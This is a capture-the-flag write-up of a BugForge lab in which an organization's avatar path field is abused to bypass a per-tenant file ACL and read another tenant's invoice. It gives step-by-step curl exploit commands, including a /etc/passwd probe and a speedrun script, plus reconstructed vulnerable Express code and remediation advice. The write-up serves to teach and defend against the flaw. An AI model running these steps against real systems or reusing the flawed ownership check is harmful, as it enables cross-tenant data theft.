---
title: Galaxy Dash - File Access
tags:
  - bugforge
  - broken-access-control
  - mass-assignment
  - idor
  - multi-tenant
  - source-maps
  - caido-mcp
aliases:
  - "/bugforge/galaxy-dash-file-access/"
  - "/BugForge/Galaxy-Dash---File-Access"
---
- Multi-tenant: every registration spins up its own organization, and invoice files are stored per-org
- The bug: an organization "avatar" field accepts an absolute file path, and the file-download route trusts that path to decide ownership. Point your avatar at another org's invoice and the access check waves you through.
- Classification: Broken Access Control on private files (CVE-2026-47182 pattern - insecure direct file access via avatar processing)

## Enumeration

Set the target:

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"
```

### Endpoint Extraction + Source Maps

This is a Create-React-App SPA backed by Express. CRA ships a source map in production by default, which hands us the original component source.

```bash
# Grab the main JS bundle filename
curl -sk "$TARGET" | grep -o 'static/js/main\.[a-f0-9]*\.js'
# main.6c630545.js

# Confirm the source map directive
curl -sk "$TARGET/static/js/main.6c630545.js" | tail -c 120
# //# sourceMappingURL=main.6c630545.js.map

# Download the source map and dump every original (non-vendor) source file
curl -sk "$TARGET/static/js/main.6c630545.js.map" | python3 -c "
import json, sys, os
m = json.load(sys.stdin)
for i, name in enumerate(m.get('sources', [])):
    if 'node_modules' not in name:
        path = '/tmp/sm/' + name.split('/')[-1]
        os.makedirs(os.path.dirname(path), exist_ok=True)
        open(path, 'w').write(m['sourcesContent'][i])
        print('  [+]', name)
"
```

Results:
- 11 React components recovered
- Express backend, CORS `*`, HS256 JWT carrying `id, username, organizationId, iat` (no expiry)

### Key Endpoints

| Method | Path | Notes |
|--------|------|-------|
| POST | /api/register | Creates user + organization, returns JWT |
| POST | /api/login | Returns JWT |
| GET | /api/verify-token | Token validation |
| GET | /api/organization | Org details |
| PUT | /api/organization | Update org |
| PUT | /api/organization/avatar | Set avatar (interesting - see below) |
| GET | /api/bookings | List own org bookings |
| POST | /api/bookings | Create booking |
| GET | /api/bookings/:id | Get booking (org-scoped) |
| GET | /api/invoices/:id | Invoice metadata (org-scoped) |
| GET | /api/locations | Delivery locations |
| GET | /api/services | Delivery tiers |
| GET/POST | /api/team | Team management |

### The Source Code Signal

`OrganizationSettings.js` has an avatar form. The help text is the whole ballgame:

```javascript
// OrganizationSettings.js
<p>Set a logo or avatar for your organisation. Accepts an image URL or an absolute file path.</p>

const handleAvatarSubmit = async (e) => {
  e.preventDefault();
  await axios.put('/api/organization/avatar', { avatar_url: avatarUrl });
};
```

"Accepts an image URL **or an absolute file path**." A field that takes a server-side file path and stores it on your record is a strong lead - anything that later reads that path is a candidate for file disclosure.

Two questions follow:
1. Does the server validate the path, or store whatever we send?
2. What reads it back out?

### Confirm the avatar field stores paths verbatim

Register first (registration creates your own org and makes you its `org_admin`, so the avatar endpoint is immediately available):

```bash
TOKEN=$(curl -sk -X POST "$TARGET/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"pwn","email":"pwn@test.com","password":"Pass123!","full_name":"pwn","org_name":"PwnOrg","business_type":"General","headquarters_planet":"Earth"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

Set the avatar to an obvious filesystem path, then read the org back:

```bash
curl -sk -X PUT "$TARGET/api/organization/avatar" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"avatar_url":"/etc/passwd"}'
# {"message":"Avatar updated successfully"}

curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/organization"
```

```json
{"id":4,"name":"PwnOrg","avatar_url":"/etc/passwd","status":"active", "...":"..."}
```

The path is stored exactly as sent. No validation, no normalization. That is the mass-assignment half of the bug. Now we need the route that consumes it.

### Find the file-serving route (content discovery)

Nothing in the frontend renders the avatar as an `<img>`, so the route that reads it is backend-only and undocumented. Time to fuzz for it.

Important: this Express app has an SPA catch-all. Every unregistered path returns the same `index.html` (HTTP 200, exactly 548 bytes). So the rule is simple - **filter out 548-byte responses, and anything left is a real route.**

```bash
# A small wordlist of file-serving names: avatar, files, file, image, images,
# media, download, serve, static, uploads, assets, ...
ffuf -u "$TARGET/api/FUZZ" \
  -H "Authorization: Bearer $TOKEN" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -fs 548 -mc all
```

`/api/files` survives the filter. Probing it directly:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/files/anything"
# {"error":"File not found"}
```

A JSON error instead of the 548-byte SPA page. This is the real file route: `GET /api/files/:filename`.

### Learn the invoice file naming scheme

Create a booking, which generates an invoice, then read the invoice metadata:

```bash
# Grab a location id and service id
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/locations"  # e.g. id=4
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/services"   # e.g. id=3

# Create a booking
curl -sk -X POST "$TARGET/api/bookings" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"origin_location_id":4,"destination_location_id":15,"cargo_size":"medium","cargo_weight_kg":500,"cargo_description":"probe","danger_level":0,"has_insurance":false,"has_premium_tracking":false,"service_id":3,"total_price":100,"calculated_risk_percent":5,"estimated_delivery_minutes":1440}'
# {"id":4,"message":"Booking created successfully", ...}

# Read its invoice metadata
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/invoices/4"
```

```json
{
  "invoice_number": "GD-2026-000004",
  "booking_id": "4",
  "file_path": "/app/invoices/GD-2026-000004.txt",
  "...": "..."
}
```

Now we know two things:
- Invoice files live at `/app/invoices/GD-2026-NNNNNN.txt`
- They are served at `GET /api/files/GD-2026-NNNNNN.txt`
- Invoice numbers are sequential, so other organizations own `...000001`, `...000002`, `...000003`

## Exploitation

### Step 1 - Establish the baseline (what the ACL allows and denies)

Read your own invoice file. It works, because your org owns invoice #4:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/files/GD-2026-000004.txt"
```

```
GALAXY DASH - INVOICE
==============================
Invoice Number : GD-2026-000004
Booking ID     : 4
...
Status   : pending
```

Now try another organization's invoice. It is correctly denied:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/files/GD-2026-000001.txt"
# {"error":"Access denied"}     (HTTP 403)
```

Three clean states confirm the ACL is real:
- Own file -> 200 + contents
- Another org's file -> 403 Access denied
- Missing file -> 404 File not found

The download route genuinely checks ownership. So we attack the ownership check itself.

### Step 2 - Bypass the ACL with the avatar field

The ownership check trusts your org's `avatar_url`. If the file you request matches the path stored in your avatar, the server treats it as "yours." So point your avatar at the victim's invoice path:

```bash
curl -sk -X PUT "$TARGET/api/organization/avatar" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"avatar_url":"/app/invoices/GD-2026-000001.txt"}'
# {"message":"Avatar updated successfully"}
```

Now re-request the exact file that returned 403 a moment ago:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/files/GD-2026-000001.txt"
```

```
GALAXY DASH - INVOICE
==============================
Invoice Number : GD-2026-000001
Booking ID     : 1
Generated      : 2024-11-03 08:14:22
...
Total    : 7931.52₵
Status   : delivered

CONFIDENTIAL - INTERNAL USE ONLY
------------------------------
Auth Token : bug{V7uXiEtjecTvrIoGDoTpCp4T21WgaTc6}
```

403 became 200. The same request, same token - only the stored avatar path changed. The access control is fully bypassed and we read another tenant's confidential invoice.

## Flag

```
bug{V7uXiEtjecTvrIoGDoTpCp4T21WgaTc6}
```

Found inside the confidential section of another organization's invoice file, read by bypassing the per-org download ACL.

## TL;DR - Speedrun

```bash
TARGET="https://lab-XXXXX.labs-app.bugforge.io"

# 1. Register (you become org_admin of a fresh org)
TOKEN=$(curl -sk -X POST "$TARGET/api/register" -H "Content-Type: application/json" \
  -d '{"username":"pwn","email":"pwn@test.com","password":"Pass123!","full_name":"pwn","org_name":"PwnOrg","business_type":"General","headquarters_planet":"Earth"}' \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

# 2. Point your org avatar at a victim invoice path (mass assignment, no validation)
curl -sk -X PUT "$TARGET/api/organization/avatar" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"avatar_url":"/app/invoices/GD-2026-000001.txt"}'

# 3. Download it - the ACL now thinks you own it (flag is in the invoice body)
curl -sk -H "Authorization: Bearer $TOKEN" "$TARGET/api/files/GD-2026-000001.txt"
```

## Why This Works - The Trusted Path

The download route checks ownership by comparing the requested file against a value the user controls (their stored `avatar_url`) instead of against an immutable record of which org owns which file. Reconstructed, the flaw looks like this:

```javascript
// VULNERABLE: ownership decided by a user-controlled field
app.get('/api/files/:filename', auth, (req, res) => {
  const filePath = path.join('/app/invoices', req.params.filename);
  const org = db.get('SELECT * FROM organizations WHERE id = ?', [req.user.organizationId]);

  // "Do you own this file?" is answered with a value YOU set:
  const ownsByInvoice = db.get(
    'SELECT 1 FROM invoices WHERE file_path = ? AND organization_id = ?',
    [filePath, req.user.organizationId]
  );
  const ownsByAvatar = (org.avatar_url === filePath);   // <-- the hole

  if (!ownsByInvoice && !ownsByAvatar) {
    return res.status(403).json({ error: 'Access denied' });
  }
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'File not found' });
  res.type('text/plain').send(fs.readFileSync(filePath, 'utf8'));
});

// VULNERABLE: avatar_url stored with no validation
app.put('/api/organization/avatar', auth, (req, res) => {
  db.run('UPDATE organizations SET avatar_url = ? WHERE id = ?',
         [req.body.avatar_url, req.user.organizationId]);   // accepts any path
  res.json({ message: 'Avatar updated successfully' });
});
```

Because the avatar can be set to an arbitrary path and the download route counts a matching avatar as proof of ownership, any authenticated user can read any file the route is willing to serve - starting with every other organization's invoices.

## Security Takeaways

### Vulnerability

- **Broken Access Control on private files** via **mass assignment**. The org `avatar_url` is attacker-controlled and stored without validation (`PUT /api/organization/avatar`), and the file-download route (`GET /api/files/:filename`) uses that field as an ownership signal. Setting the avatar to a target file's path bypasses the per-organization ACL. This mirrors CVE-2026-47182 (insecure direct file access through avatar processing).

### Impact

- Cross-organization data breach: full invoice contents (pricing, totals, status, embedded auth tokens) for every other tenant
- Invoice numbers are sequential, so the entire invoice set is enumerable end to end
- The "absolute file path" design intends arbitrary server-side paths, so the same primitive points at any file the process can read and the route will return as text - well beyond the invoice directory

### Root Cause

- Authorization based on a mutable, user-controlled attribute (`avatar_url`) instead of an immutable ownership record
- Mass assignment: a path field accepted from the client and persisted without allow-listing, validation, or type checks (a path is treated the same as an image URL)
- Conflating "the user set this" with "the user owns this"

### Remediation

- Decide file ownership from a trusted server-side record only: `SELECT ... FROM invoices WHERE file_path = ? AND organization_id = ?`. Never let an editable profile field grant file access.
- Validate the avatar field: accept only `https://` image URLs, or only files inside a dedicated uploads directory after canonicalizing the path and confirming it stays within that root (block `..`, absolute paths, and symlinks).
- Serve files by an opaque ID mapped to an ownership row, not by a client-supplied filename or path.
- Apply least privilege to the service account so even a path-traversal style request cannot reach sensitive system files.
